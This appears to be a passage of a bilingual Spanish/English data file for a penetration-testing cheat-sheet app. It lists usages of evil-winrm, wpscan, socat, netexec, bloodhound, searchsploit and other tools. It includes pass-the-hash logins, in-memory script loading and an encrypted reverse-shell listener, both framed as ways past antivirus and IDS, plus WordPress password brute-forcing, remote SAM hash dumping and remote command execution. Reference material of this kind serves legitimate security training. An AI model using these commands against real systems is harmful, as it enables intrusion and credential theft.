evil-winrm -i 10.10.10.152 -u Administrator -p 'P@ssw0rd123!'

TIP: Si estás operando en una red lenta, puedes cambiar el timeout por defecto agregando el flag -t 30 para evitar desconexiones accidentales.
===FIN===

===CASO===
TITULO: Conexión Pass-the-Hash (PtH) utilizando hashes NTLM
CATEGORIA: Post-explotación
DIFICULTAD: intermedio
FRECUENCIA: común

COMANDO:
evil-winrm -i <target_ip> -u <username> -H <ntlm_hash>

FLAGS:
-H → Inyecta directamente la firma hash NTLM del usuario de destino para omitir la autenticación por contraseña convencional.

EJEMPLO:
evil-winrm -i 10.10.10.152 -u Administrator -H 329153f560eb48b100da2c5447847a9e

TIP: Es la técnica perfecta cuando has recuperado hashes con secretsdump o mimikatz pero no puedes crackearlos con rockyou.
===FIN===

===CASO===
TITULO: Carga dinámica y ejecución en memoria de scripts PowerShell evitando la escritura en disco
CATEGORIA: Evasión
DIFICULTAD: avanzado
FRECUENCIA: común

COMANDO:
evil-winrm -i <target_ip> -u <username> -p <password> -s <local_scripts_dir>

FLAGS:
-s → Detalla un directorio local de tu máquina atacante que contiene scripts .ps1. Evil-winrm los cargará bajo demanda directamente en la sesión de Powershell remota en RAM.

EJEMPLO:
evil-winrm -i 10.10.10.152 -u local_admin -p SecureClave1! -s /opt/powershell_scripts/

TIP: Una vez dentro del prompt interactivo, simplemente escribe el nombre de cualquier script local (ej: Invoke-PowerUp.ps1) para ejecutarlo en RAM eludiendo detecciones básicas de firmas de antivirus en disco.
===FIN===`,rawTextEn:`===CASO===
TITULO: Standard interactive Windows shell connection via WinRM with valid credentials
CATEGORIA: Post-explotación
DIFICULTAD: básico
FRECUENCIA: siempre

COMANDO:
evil-winrm -i <target_ip> -u <username> -p <password>

FLAGS:
-i → Specifies the target Windows server IP address running WinRM services (Port 5985 HTTP / 5986 HTTPS).
-u → Defines the remote user login (e.g. Administrator).
-p → Plaintext password associated with the account.

EJEMPLO:
evil-winrm -i 10.10.10.152 -u Administrator -p 'P@ssw0rd123!'

TIP: If executing over slow proxies or VPN connections, increase network timeout margins with -t 30 to avoid termination drops.
===FIN===

===CASO===
TITULO: Pass-the-Hash (PtH) session execution utilizing NTLM credential hashes
CATEGORIA: Post-explotación
DIFICULTAD: intermedio
FRECUENCIA: común

COMANDO:
evil-winrm -i <target_ip> -u <username> -H <ntlm_hash>

FLAGS:
-H → Direct injection of the target user's NTLM hash bypassing standard password prompts.

EJEMPLO:
evil-winrm -i 10.10.10.152 -u Administrator -H 329153f560eb48b100da2c5447847a9e

TIP: Outstanding solution when you have extracted hashes from LSASS memory but they are too complex to crack offline.
===FIN===

===CASO===
TITULO: Dynamic PowerShell script loading in-memory bypassing physical disk writing
CATEGORIA: Evasión
DIFICULTAD: avanzado
FRECUENCIA: común

COMANDO:
evil-winrm -i <target_ip> -u <username> -p <password> -s <local_scripts_dir>

FLAGS:
-s → Specifies local absolute directory hosting helper .ps1 scripts. Evil-WinRM dynamically loads them into remote shell memory.

EJEMPLO:
evil-winrm -i 10.10.10.152 -u local_admin -p SecureClave1! -s /opt/powershell_scripts/

TIP: Once established in the session, type the script filename (e.g. Invoke-PowerUp.ps1) to launch scripts directly in RAM, avoiding common file integrity checkers on disk.
===FIN===`},wpscan:{name:"wpscan",description:"Escáner de vulnerabilidades de WordPress para auditar plugins, temas y usuarios expuestos",descriptionEn:"WordPress security vulnerability scanner targeting themes, plugins, and users enumeration",category:"Web",rawText:`===CASO===
TITULO: Enumeración exhaustiva de plugins vulnerables, temas y usuarios en WordPress
CATEGORIA: Web
DIFICULTAD: básico
FRECUENCIA: siempre

COMANDO:
wpscan --url <target_url> -e vp,vt,u --api-token <wpscan_api_token>

FLAGS:
--url → URL principal de la instalación de WordPress a escanear.
-e → Especifica qué elementos enumerar de forma agresiva: "vp" (vulnerable plugins), "vt" (vulnerable themes), "u" (usernames/usuarios).
--api-token → Token de API opcional gratuito del sitio oficial de WPScan para cruzar resultados y mostrar IDs de vulnerabilidad CVE exactos.

EJEMPLO:
wpscan --url http://blog.target.htb/ -e vp,vt,u --api-token XyZ123ABC_token

TIP: Si el sitio web utiliza Cloudflare o bloquea peticiones automatizadas ruidosas, puedes simular peticiones con el flag --random-user-agent.
===FIN===

===CASO===
TITULO: Ataque de diccionario contra las cuentas de usuario identificadas
CATEGORIA: Passwords
DIFICULTAD: intermedio
FRECUENCIA: común

COMANDO:
wpscan --url <target_url> -U <users_list> -P <passwords_wordlist> --multithreaded <threads_num>

FLAGS:
-U → Lista de nombres de usuario de WordPress (obtenidos con la fase de enumeración).
-P → Diccionario de contraseñas de fuerza bruta.
--multithreaded → Ejecuta múltiples hilos paralelos para acelerar las peticiones HTTP POST contra wp-login.php.

EJEMPLO:
wpscan --url http://blog.target.htb/ -U admin,editor -P /usr/share/wordlists/rockyou.txt --multithreaded 15

TIP: WPScan guarda un historial interno de las pruebas; si el proceso se cancela, puedes continuarlo con el flag --resume.
===FIN===`,rawTextEn:`===CASO===
TITULO: Comprehensive WordPress auditing for vulnerable plugins, themes, and users
CATEGORIA: Web
DIFICULTAD: básico
FRECUENCIA: siempre

COMANDO:
wpscan --url <target_url> -e vp,vt,u --api-token <wpscan_api_token>

FLAGS:
--url → Configures base WordPress host target endpoint.
-e → Directs enumeration modules: "vp" (vulnerable plugins), "vt" (vulnerable themes), "u" (usernames list).
--api-token → Optional free security API token from WPScan registry to fetch real CVE references.

EJEMPLO:
wpscan --url http://blog.target.htb/ -e vp,vt,u --api-token XyZ123ABC_token

TIP: If target structures utilize rate-limiting filters, emulate real visitors profiles by adding the --random-user-agent flag.
===FIN===

===CASO===
TITULO: Target user dictionary attack against WordPress login panels
CATEGORIA: Passwords
DIFICULTAD: intermedio
FRECUENCIA: común

COMANDO:
wpscan --url <target_url> -U <users_list> -P <passwords_wordlist> --multithreaded <threads_num>

FLAGS:
-U → Target WordPress account usernames.
-P → Password dictionary lists.
--multithreaded → Elevates concurrency threads to complete web POST requests against wp-login.php faster.

EJEMPLO:
wpscan --url http://blog.target.htb/ -U admin,editor -P /usr/share/wordlists/rockyou.txt --multithreaded 15

TIP: WPScan automatically saves transaction backups; if connection timeouts abort your attack, append the --resume tag.
===FIN===`},socat:{name:"socat",description:"Relevador de datos multidireccional bidireccional avanzado (Socket Cat)",descriptionEn:"Multipurpose bidirectional relay tool for advanced port forwarding, reverse shells, and sockets",category:"Post-explotación",rawText:`===CASO===
TITULO: Establecer un proxy de redirección TCP para saltar de un puerto interno aislado a una máquina exterior
CATEGORIA: Post-explotación
DIFICULTAD: intermedio
FRECUENCIA: común

COMANDO:
socat TCP-LISTEN:<local_listening_port>,fork TCP:<next_hop_ip>:<requested_port>

FLAGS:
TCP-LISTEN → Abre un puerto local en el host comprometido intermedio.
fork → Permite aceptar múltiples conexiones entrantes concurrentes sin colapsar el proceso principal.
TCP → Indica el destino final del tráfico de red (IP y puerto del servidor aislado).

EJEMPLO:
socat TCP-LISTEN:8080,fork TCP:192.168.1.50:80

TIP: Súper útil para hacer pivoting táctico y acceder a paneles de administración de impresoras, routers o intranets internas a las que tu máquina de ataque no tiene ruta directa de enrutamiento.
===FIN===

===CASO===
TITULO: Consola reversa interactiva completamente encriptada mediante certificados SSL/TLS
CATEGORIA: Evasión
DIFICULTAD: avanzado
FRECUENCIA: ocasional

COMANDO:
socat OPENSSL-LISTEN:<listening_port>,cert=<pem_cert_file>,verify=0 FILE:\`tty\`,raw,echo=0

FLAGS:
OPENSSL-LISTEN → Escucha de forma cifrada mediante capa SSL para evadir inspecciones de paquetes profundas de IDS de red corporativos.
cert → Especifica la ruta al certificado SSL PEM generado.
verify=0 → Deshabilita la validación del certificado para agilizar el emparejamiento rápido del socket.
FILE:\`tty\`,raw,echo=0 → Permite interactuar con la consola de forma limpia, admitiendo tabuladores, atajos (Ctrl+C) e historiales.

EJEMPLO:
socat OPENSSL-LISTEN:4443,cert=cert.pem,verify=0 FILE:\`tty\`,raw,echo=0

TIP: Este es el estándar de oro en OPSEC para recibir sesiones de control remotas: los IDS solo verán tráfico cifrado TLS homogéneo sin rastro de comandos de consola.
===FIN===`,rawTextEn:`===CASO===
TITULO: Establish a TCP relay proxy to route isolated internal ports to attacking machines
CATEGORIA: Post-explotación
DIFICULTAD: intermedio
FRECUENCIA: común

COMANDO:
socat TCP-LISTEN:<local_listening_port>,fork TCP:<next_hop_ip>:<requested_port>

FLAGS:
TCP-LISTEN → Spawns listening sockets on the intermediate pivot server.
fork → Allows concurrent connection handling keeping the daemon active.
TCP → Redirect destination matching targeted offline assets.

EJEMPLO:
socat TCP-LISTEN:8080,fork TCP:192.168.1.50:80

TIP: Unbelievable utility for pivoting setups, bridging restricted subnets back to reachable interfaces.
===FIN===

===CASO===
TITULO: Full interactive reverse shell encrypted via custom SSL/TLS certificates
CATEGORIA: Evasión
DIFICULTAD: avanzado
FRECUENCIA: ocasional

COMANDO:
socat OPENSSL-LISTEN:<listening_port>,cert=<pem_cert_file>,verify=0 FILE:\`tty\`,raw,echo=0

FLAGS:
OPENSSL-LISTEN → Encrypted TLS server port listener protecting payload delivery profiles from simple deep-packet network sensors.
cert → Direct path pointing to local SSL certificate container.
verify=0 → Aborts client verification handshakes for rapid tunnel connection.
FILE:\`tty\`,raw,echo=0 → Grants fully featured tty interaction supporting arrows navigation, history records, and Ctrl+C interrupt signals.

EJEMPLO:
socat OPENSSL-LISTEN:4443,cert=cert.pem,verify=0 FILE:\`tty\`,raw,echo=0

TIP: Gold standard of high-OPSEC transport: network monitoring platforms will classify connection records as typical HTTPS sessions.
===FIN===`},nikto:{name:"nikto",description:"Escáner de servidores web para identificar malas configuraciones, CGI obsoletos y archivos vulnerables",descriptionEn:"Comprehensive web server scanner for configuration audits and CGI script analysis",category:"Web",rawText:`===CASO===
TITULO: Escaneo de vulnerabilidades web estándar contra un host de destino
CATEGORIA: Web
DIFICULTAD: básico
FRECUENCIA: siempre

COMANDO:
nikto -h <target_url> -o <output_filename>.txt

FLAGS:
-h → Especifica el host de destino, que puede ser una dirección IP, un nombre de dominio o una URL web con un puerto personalizado.
-o → Guarda un reporte consolidado con los problemas de seguridad detectados.

EJEMPLO:
nikto -h http://10.10.10.124:80/ -o nikto_scan.txt

TIP: Nikto es un escáner muy ruidoso; generará cientos de entradas en los logs del servidor objetivo, por lo que es fácil de detectar por IDS.
===FIN===

===CASO===
TITULO: Escaneo web sigiloso utilizando un proxy de depuración intermedio (ej: Burp Suite)
CATEGORIA: Evasión
DIFICULTAD: intermedio
FRECUENCIA: común

COMANDO:
nikto -h <target_url> -useproxy http://<proxy_ip>:<proxy_port>

FLAGS:
-useproxy → Enruta todo el tráfico de Nikto a través de un proxy HTTP (como Burp Suite local en 127.0.0.1:8080).

EJEMPLO:
nikto -h http://10.10.10.124/ -useproxy http://127.0.0.1:8080

TIP: Pasar el escaneo por Burp Suite te permite revisar minuciosamente las peticiones, respuestas y cookies de sesión exactas enviadas durante el proceso de auditoría.
===FIN===`,rawTextEn:`===CASO===
TITULO: Standard web vulnerability assessment scan against target host
CATEGORIA: Web
DIFICULTAD: básico
FRECUENCIA: siempre

COMANDO:
nikto -h <target_url> -o <output_filename>.txt

FLAGS:
-h → Target web host address, IP, or custom domain URL.
-o → Output file saving findings.

EJEMPLO:
nikto -h http://10.10.10.124:80/ -o nikto_scan.txt

TIP: Nikto generates a high volume of HTTP requests; expect quick detections on typical corporate SIEMs and active firewalls.
===FIN===`},amass:{name:"amass",description:"Herramienta de descubrimiento en profundidad de subdominios y mapeo activo/pasivo de superficies de ataque de OWASP",descriptionEn:"In-depth subdomain discovery, active/passive mapping tool from OWASP project",category:"Reconocimiento",rawText:`===CASO===
TITULO: Enumeración pasiva de subdominios para un dominio de manera sigilosa sin tocar el host directamente
CATEGORIA: Reconocimiento
DIFICULTAD: básico
FRECUENCIA: siempre

COMANDO:
amass enum -passive -d <domain_name> -src

FLAGS:
enum → Módulo principal de Amass para ejecutar recolección y enumeración de nombres DNS.
-passive → Omitirá consultas DNS directas para evitar interactuar con los servidores de nombres del objetivo (recolección puramente pasiva).
-d → Especifica el dominio raíz o de destino que deseas auditar.
-src → Muestra la fuente exacta (motor de búsqueda, API, registros históricos) de donde se recuperó cada subdominio.

EJEMPLO:
amass enum -passive -d megacorp.com -src

TIP: Configura las claves de API gratuitas en el archivo ~/.config/amass/config.ini para incrementar exponencialmente las fuentes de datos y obtener mejores resultados.
===FIN===

===CASO===
TITULO: Enumeración activa con resolución DNS forzada e intercambio de transferencias de zona
CATEGORIA: Reconocimiento
DIFICULTAD: avanzado
FRECUENCIA: común

COMANDO:
amass enum -active -d <domain_name> -brute -w <wordlist_path> -o <output_file>.txt

FLAGS:
-active → Activa la verificación mediante consultas directas a los servidores DNS correspondientes para confirmar que los registros estén activos.
-brute → Habilita el ataque de fuerza bruta DNS combinándolo con diccionarios de palabras.
-w → Ruta al diccionario de subdominios personalizados.
-o → Guarda una lista final con los subdominios que respondieron con éxito.

EJEMPLO:
amass enum -active -d megacorp.com -brute -w /usr/share/wordlists/subdomains-top1mil.txt -o subdomains_amass.txt

TIP: Ten cuidado al utilizar -active, ya que interactúa directamente con los servidores de nombres del objetivo y registrarán tus consultas.
===FIN===`,rawTextEn:`===CASO===
TITULO: Passive subdomain enumeration avoiding target network interaction
CATEGORIA: Reconocimiento
DIFICULTAD: básico
FRECUENCIA: siempre

COMANDO:
amass enum -passive -d <domain_name> -src

FLAGS:
enum → Main reconnaissance execution module.
-passive → Directs passive querying via OSINT sources only without probing target IP assets.
-d → Target domain address.
-src → Display the specific origin datasource for each identified subdomain.

EJEMPLO:
amass enum -passive -d megacorp.com -src

TIP: Always define API keys in ~/.config/amass/config.ini to unlock advanced search queries from tools like Censys, Shodan, or SecurityTrails.
===FIN===`},nuclei:{name:"nuclei",description:"Escáner de vulnerabilidades rápido y plantilla personalizable basado en YAML",descriptionEn:"Fast and customizable vulnerability scanner based on simple YAML templates",category:"Web",rawText:`===CASO===
TITULO: Escanear un host objetivo utilizando plantillas de vulnerabilidades críticas y altas
CATEGORIA: Web
DIFICULTAD: básico
FRECUENCIA: siempre

COMANDO:
nuclei -u <target_url> -severity critical,high

FLAGS:
-u → Define el host o URL objetivo para realizar el escaneo de vulnerabilidades.
-severity → Filtra las plantillas para ejecutar únicamente las catalogadas con severidad crítica o alta.

EJEMPLO:
nuclei -u http://example.htb -severity critical,high

TIP: Nuclei descarga y actualiza automáticamente las plantillas oficiales de la comunidad de ProjectDiscovery al iniciarse por primera vez.
===FIN===

===CASO===
TITULO: Escaneo de tecnologías específicas (ej. IIS o Apache) utilizando filtros específicos
CATEGORIA: Web
DIFICULTAD: intermedio
FRECUENCIA: común

COMANDO:
nuclei -u <target_url> -t <templates_directory>

FLAGS:
-t → Ruta específica del archivo de plantilla YAML o del directorio de plantillas a utilizar en el escaneo.

EJEMPLO:
nuclei -u http://10.10.10.15 -t technologies/iis-detect.yaml

TIP: Es perfecto para ahorrar ancho de banda ejecutando únicamente firmas de tecnologías que previamente has detectado que están corriendo en el servidor.
===FIN===`,rawTextEn:`===CASO===
TITULO: Scan a target host using critical and high severity templates
CATEGORIA: Web
DIFICULTAD: básico
FRECUENCIA: siempre

COMANDO:
nuclei -u <target_url> -severity critical,high

FLAGS:
-u → Configures the destination target host URL.
-severity → Restricts scanning executions to high or critical vulnerability templates.

EJEMPLO:
nuclei -u http://example.htb -severity critical,high

TIP: Nuclei automatically synchronizes the latest community templates from GitHub during startup.
===FIN===`},searchsploit:{name:"searchsploit",description:"Herramienta de búsqueda en la línea de comandos para la base de datos local Exploit Database",descriptionEn:"Command-line search tool for Exploit-DB local offline archives",category:"Reconocimiento",rawText:`===CASO===
TITULO: Buscar exploits conocidos para un servicio y versión específicos
CATEGORIA: Reconocimiento
DIFICULTAD: básico
FRECUENCIA: siempre

COMANDO:
searchsploit <service_name> <version_number>

FLAGS:
<service_name> → Nombre de la aplicación, CMS, plugin o sistema operativo que buscas comprometer (ej: EternalBlue, OpenSSH).
<version_number> → Parámetro de versión opcional para acotar los resultados.

EJEMPLO:
searchsploit openssh 7.2

TIP: Realiza búsquedas sin discriminar mayúsculas de minúsculas para encontrar variantes como "WordPress" o "wordpress".
===FIN===

===CASO===
TITULO: Copiar un archivo de exploit de la base de datos al directorio de trabajo actual
CATEGORIA: Reconocimiento
DIFICULTAD: básico
FRECUENCIA: siempre

COMANDO:
searchsploit -m <exploit_id>

FLAGS:
-m → Copia (espeja) el archivo del exploit seleccionado utilizando su ID directamente a tu carpeta actual de trabajo.

EJEMPLO:
searchsploit -m 39166

TIP: Esto evita tener que navegar manualmente por las rutas complejas de /usr/share/exploitdb/ para extraer y compilar tus cargas de explotación.
===FIN===

===CASO===
TITULO: Buscar exploits basados en los resultados de un escaneo de Nmap (XML)
CATEGORIA: Reconocimiento
DIFICULTAD: avanzado
FRECUENCIA: común

COMANDO:
searchsploit --nmap <nmap_xml_file>

FLAGS:
--nmap → Lee el archivo XML de salida de un escaneo de Nmap y busca de forma automatizada exploits para todos los servicios y versiones detectadas.

EJEMPLO:
searchsploit --nmap scan_results.xml

TIP: Agiliza enormemente el análisis inicial de puertos abiertos y servicios expuestos cruzando datos de versiones de forma masiva.
===FIN===

===CASO===
TITULO: Mostrar la URL de Exploit-DB y detalles en línea de un exploit por su ID
CATEGORIA: Reconocimiento
DIFICULTAD: básico
FRECUENCIA: común

COMANDO:
searchsploit -p <exploit_id>

FLAGS:
-p → Muestra la ruta completa en el sistema local para el ID especificado, además del enlace URL directo al sitio oficial de Exploit-DB.

EJEMPLO:
searchsploit -p 39166

TIP: Muy útil para leer el código fuente del exploit directamente usando cat o inspectores de texto locales sin moverlo de ubicación.
===FIN===

===CASO===
TITULO: Examinar el código fuente de un exploit local por su ID sin copiarlo
CATEGORIA: Reconocimiento
DIFICULTAD: básico
FRECUENCIA: común

COMANDO:
searchsploit -x <exploit_id>

FLAGS:
-x → Abre el código del exploit localmente usando el paginador predeterminado (PAGER) o editor de texto del sistema para inspeccionarlo de forma inmediata.

EJEMPLO:
searchsploit -x 39166

TIP: Te permite auditar el script y verificar sus requisitos de ejecución o parámetros antes de compilarlo o lanzarlo.
===FIN===

===CASO===
TITULO: Buscar exploits excluyendo términos de búsqueda ruidosos (ej. Denegación de Servicio / DoS)
CATEGORIA: Reconocimiento
DIFICULTAD: intermedio
FRECUENCIA: común

COMANDO:
searchsploit <search_term> --exclude="<exclude_term>"

FLAGS:
--exclude → Filtra la lista de resultados omitiendo cualquier exploit cuyo título o metadata contenga la palabra clave especificada.

EJEMPLO:
searchsploit apache --exclude="dos"

TIP: Extremadamente útil para aislar exploits que ofrezcan ejecución remota de código (RCE) o escalada de privilegios y evitar el ruido de exploits de caída de servicio.
===FIN===`,rawTextEn:`===CASO===
TITULO: Search for public exploits targeting a specific service and version
CATEGORIA: Reconocimiento
DIFICULTAD: básico
FRECUENCIA: siempre

COMANDO:
searchsploit <service_name> <version_number>

FLAGS:
<service_name> → Name of the target application, protocol, or daemon.
<version_number> → Target version query to narrow search hits.

EJEMPLO:
searchsploit openssh 7.2

TIP: Keep terms generic to maximize your chances of locating local exploits.
===FIN===

===CASO===
TITULO: Automatically search exploits based on Nmap XML scan results
CATEGORIA: Reconocimiento
DIFICULTAD: avanzado
FRECUENCIA: común

COMANDO:
searchsploit --nmap <nmap_xml_file>

FLAGS:
--nmap → Inspects and parses Nmap XML reports to locate matching public exploits for active versions.

EJEMPLO:
searchsploit --nmap scan_results.xml

TIP: Greatly reduces discovery turnaround periods by automating vulnerability service correlations.
===FIN===

===CASO===
TITULO: Examine the source code of an exploit by its ID without copying it
CATEGORIA: Reconocimiento
DIFICULTAD: básico
FRECUENCIA: común

COMANDO:
searchsploit -x <exploit_id>

FLAGS:
-x → Launches your local viewer or PAGER to immediately read the exploit's instructions or source code.

EJEMPLO:
searchsploit -x 39166

TIP: Always review the source code of any public exploit before executing it to prevent backdoors or unintended consequences.
===FIN===

===CASO===
TITULO: Search for exploits excluding specific keywords like Denial of Service (DoS)
CATEGORIA: Reconocimiento
DIFICULTAD: intermedio
FRECUENCIA: común

COMANDO:
searchsploit <search_term> --exclude="<exclude_term>"

FLAGS:
--exclude → Filters the list of matches by ignoring any entries that contain the specified term.

EJEMPLO:
searchsploit apache --exclude="dos"

TIP: Helps isolate valuable Remote Code Execution (RCE) vectors by weeding out less useful DoS scripts.
===FIN===`},rpcclient:{name:"rpcclient",description:"Herramienta interactiva para consultar y administrar información de Windows/Samba a través de llamadas RPC",descriptionEn:"Interactive command-line tool to query and manage MS-RPC endpoints on Windows and Samba systems",category:"Reconocimiento",rawText:`===CASO===
TITULO: Conexión anónima (Sesión Nula) para enumerar usuarios de dominio
CATEGORIA: Reconocimiento
DIFICULTAD: básico
FRECUENCIA: siempre

COMANDO:
rpcclient -U "" -N <target_ip>

FLAGS:
-U "" → Especifica un usuario vacío (anónimo).
-N → Indica que no se solicita contraseña.

EJEMPLO:
rpcclient -U "" -N 10.10.10.134

TIP: Dentro de la shell interactiva de rpcclient, ejecuta "enumdomusers" para listar todos los usuarios o "querydominfo" para obtener información básica del dominio.
===FIN===

===CASO===
TITULO: Conexión autenticada para enumerar grupos y privilegios
CATEGORIA: Reconocimiento
DIFICULTAD: intermedio
FRECUENCIA: común

COMANDO:
rpcclient -U "<username>%<password>" <target_ip>

FLAGS:
-U → Proporciona el nombre de usuario y contraseña de dominio separados por el carácter "%".

EJEMPLO:
rpcclient -U "administrator%Password123" 10.10.10.134

TIP: Utiliza los comandos interactivos "enumdomgroups" y "enumprivs" para explorar la pertenencia a grupos y los privilegios asignados.
===FIN===`,rawTextEn:`===CASO===
TITULO: Establish anonymous null session to enumerate domain users
CATEGORIA: Reconocimiento
DIFICULTAD: básico
FRECUENCIA: siempre

COMANDO:
rpcclient -U "" -N <target_ip>

FLAGS:
-U "" → Uses empty credentials for anonymous access.
-N → Tells rpcclient to suppress password prompts.

EJEMPLO:
rpcclient -U "" -N 10.10.10.134

TIP: Run "enumdomusers" inside the interactive rpcclient shell to list all domain accounts.
===FIN===`},curl:{name:"curl",description:"Herramienta robusta de línea de comandos para transferir datos y realizar peticiones HTTP/S",descriptionEn:"Command-line tool for transferring data with URLs, supporting various protocols including HTTP/S",category:"Web",rawText:`===CASO===
TITULO: Realizar petición GET básica e inspeccionar cabeceras HTTP de respuesta
CATEGORIA: Web
DIFICULTAD: básico
FRECUENCIA: siempre

COMANDO:
curl -i <target_url>

FLAGS:
-i → Incluye las cabeceras HTTP del servidor de respuesta en la salida estándar.

EJEMPLO:
curl -i http://10.10.10.124/index.html

TIP: Útil para identificar de forma rápida servidores web (Server: Apache, IIS) y tecnologías de backend antes de lanzar escaneos pesados.
===FIN===

===CASO===
TITULO: Enviar datos mediante método POST para probar logins o formularios
CATEGORIA: Web
DIFICULTAD: intermedio
FRECUENCIA: común

COMANDO:
curl -X POST -d "<post_data>" <target_url>

FLAGS:
-X POST → Fuerza el uso del método HTTP POST en lugar del GET por defecto.
-d → Define el cuerpo de datos o parámetros codificados que se enviarán (ej: username=admin&password=admin).

EJEMPLO:
curl -X POST -d "user=admin&pass=admin" http://10.10.10.124/login.php

TIP: Puedes simular un inicio de sesión completo enviando cabeceras de tipo de contenido con -H "Content-Type: application/x-www-form-urlencoded".
===FIN===

===CASO===
TITULO: Descargar un script remoto y guardarlo con su nombre original
CATEGORIA: Web
DIFICULTAD: básico
FRECUENCIA: común

COMANDO:
curl -O <remote_file_url>

FLAGS:
-O → Guarda el archivo descargado localmente utilizando exactamente el mismo nombre que tiene en el servidor remoto.

EJEMPLO:
curl -O http://10.10.14.3:8000/linpeas.sh

TIP: Si necesitas renombrarlo localmente, utiliza la opción -o minúscula seguida del nuevo nombre deseado, por ejemplo, -o test.sh.
===FIN===`,rawTextEn:`===CASO===
TITULO: Send a basic HTTP GET request and show HTTP headers
CATEGORIA: Web
DIFICULTAD: básico
FRECUENCIA: siempre

COMANDO:
curl -i <target_url>

FLAGS:
-i → Includes protocol headers in the output along with response body.

EJEMPLO:
curl -i http://10.10.10.124/index.html

TIP: Useful to quickly inspect cookies and server versions.
===FIN===`},netexec:{name:"netexec",description:"La suite de post-explotación y evaluación de red multi-protocolo definitiva (sucesor de CrackMapExec)",descriptionEn:"Ultimate multi-protocol network security assessment and post-exploitation suite (successor of CrackMapExec)",category:"Reconocimiento",rawText:`===CASO===
TITULO: Enumerar recursos compartidos y estado de firma SMB en una red
CATEGORIA: Reconocimiento
DIFICULTAD: básico
FRECUENCIA: siempre

COMANDO:
nxc smb <target_ip_range> --shares

FLAGS:
smb → Especifica el protocolo SMB como objetivo de análisis.
--shares → Intenta enumerar todos los recursos compartidos disponibles en cada host.

EJEMPLO:
nxc smb 10.10.10.0/24 --shares

TIP: NetExec resaltará en color verde si la firma SMB está desactivada ("signing: False"), lo cual permite ataques de retransmisión (SMB Relay).
===FIN===

===CASO===
TITULO: Verificar credenciales y ejecutar comandos remotos de forma masiva
CATEGORIA: Reconocimiento
DIFICULTAD: intermedio
FRECUENCIA: común

COMANDO:
nxc smb <target_ip> -u <username> -p <password> -x "<command>"

FLAGS:
-u → Nombre de usuario objetivo.
-p → Contraseña del usuario objetivo.
-x → Ejecuta un comando del sistema (CMD/PowerShell) en el host remoto si se tiene permisos de administrador.

EJEMPLO:
nxc smb 10.10.10.150 -u administrator -p 'SecureP@ss123' -x "whoami /all"

TIP: Si las credenciales son de administrador local de alto rango, NetExec mostrará un distintivo de éxito "+Pwn3d!" en color amarillo brillante.
===FIN===

===CASO===
TITULO: Extraer credenciales locales (SAM) de forma remota
CATEGORIA: Reconocimiento
DIFICULTAD: avanzado
FRECUENCIA: común

COMANDO:
nxc smb <target_ip> -u <username> -p <password> --sam

FLAGS:
--sam → Vuelca e interpreta los hashes de contraseñas de cuentas locales desde el registro SAM.

EJEMPLO:
nxc smb 10.10.10.150 -u administrator -p 'SecureP@ss123' --sam

TIP: Esto requiere tener privilegios de administrador local en la máquina remota de destino para poder consultar el registro protegido.
===FIN===`,rawTextEn:`===CASO===
TITULO: Check credentials across network range and identify admin access
CATEGORIA: Reconocimiento
DIFICULTAD: básico
FRECUENCIA: siempre

COMANDO:
nxc smb <target_ip_range> -u <username> -p <password>

FLAGS:
-u → Target username.
-p → Target password.

EJEMPLO:
nxc smb 10.10.10.0/24 -u administrator -p 'SecureP@ss123'

TIP: Successful administrator access is highlighted with "+Pwn3d!".
===FIN===`},bloodhound:{name:"bloodhound",description:"Herramienta gráfica para descubrir y analizar relaciones complejas de relaciones en Active Directory",descriptionEn:"Single-page Active Directory security analyzer mapping domain permissions visually",category:"Post-explotación",rawText:`===CASO===
TITULO: Recolección masiva de datos en Active Directory utilizando el recopilador SharpHound (.exe)
CATEGORIA: Post-explotación
DIFICULTAD: avanzado
FRECUENCIA: siempre

COMANDO:
SharpHound.exe --CollectionMethods All --Domain <domain_name>

FLAGS:
--CollectionMethods All → Recopila de forma exhaustiva información de sesiones, políticas de grupo, pertenencias, ACLs y equipos.
--Domain → Especifica el dominio de Active Directory de destino que deseas auditar.

EJEMPLO:
SharpHound.exe --CollectionMethods All --Domain corp.local

TIP: SharpHound generará un archivo .zip consolidado; este archivo comprimido debe descargarse para importarlo directamente en la interfaz gráfica de BloodHound.
===FIN===

===CASO===
TITULO: Recolección desde Linux mediante python-bloodhound sin necesidad de unirse al dominio
CATEGORIA: Post-explotación
DIFICULTAD: avanzado
FRECUENCIA: común

COMANDO:
bloodhound-python -u <username> -p <password> -d <domain> -dc <dc_fqdn_or_ip> -c All

FLAGS:
-u → Cuenta de usuario de dominio de Active Directory válida.
-p → Contraseña en texto plano o hash NTLM del usuario de dominio.
-dc → Dirección IP o nombre completo (FQDN) del Controlador de Dominio.
-c All → Métodos de recolección activos combinados.

EJEMPLO:
bloodhound-python -u jsmith -p 'P@ssword123' -d corp.local -dc dc01.corp.local -c All

TIP: Súper útil cuando estás auditando la red interna desde tu máquina atacante Linux (ej: Kali) sin estar en una máquina Windows comprometida.
===FIN===`,rawTextEn:`===CASO===
TITULO: Run complete domain ingestion with SharpHound.exe payload collector
CATEGORIA: Post-explotación
DIFICULTAD: avanzado
FRECUENCIA: siempre

COMANDO:
SharpHound.exe --CollectionMethods All --Domain <domain_name>

FLAGS:
--CollectionMethods All → Executes full enumeration covering group memberships, sessions, and ACLs.
--Domain → Active Directory target domain context.

EJEMPLO:
SharpHound.exe --CollectionMethods All --Domain corp.local

TIP: SharpHound compresses extracted telemetry inside an encrypted zip file, ready for importing.
===FIN===`},"enum4linux-ng":{name:"enum4linux-ng",description:"Versión moderna y reescrita en Python de la clásica herramienta para enumerar datos de hosts Windows y Samba",descriptionEn:"Next generation Python version of the classic tool to query and enumerate Windows and Samba systems",category:"Reconocimiento",rawText:`===CASO===
TITULO: Enumeración completa y automatizada de recursos compartidos, usuarios y políticas en Windows/Samba
CATEGORIA: Reconocimiento
DIFICULTAD: básico
FRECUENCIA: siempre

COMANDO:
enum4linux-ng -A <target_ip>

FLAGS:
-A → Ejecuta de manera secuencial todos los módulos de recopilación disponibles (usuarios, grupos, recursos compartidos, políticas de contraseñas, etc.).

EJEMPLO:
enum4linux-ng -A 10.10.10.134

TIP: Emplea consultas RPC anónimas y de sesión nula por defecto; si el acceso anónimo está bloqueado, proporciona credenciales válidas con los flags -u y -p.
===FIN===

===CASO===
TITULO: Enumeración autenticada de Windows/Samba con credenciales válidas
CATEGORIA: Reconocimiento
DIFICULTAD: intermedio
FRECUENCIA: común

COMANDO:
enum4linux-ng -u "<username>" -p "<password>" <target_ip>

FLAGS:
-u → Especifica el nombre de usuario de dominio o local para realizar la autenticación.
-p → Especifica la contraseña correspondiente al usuario proporcionado.

EJEMPLO:
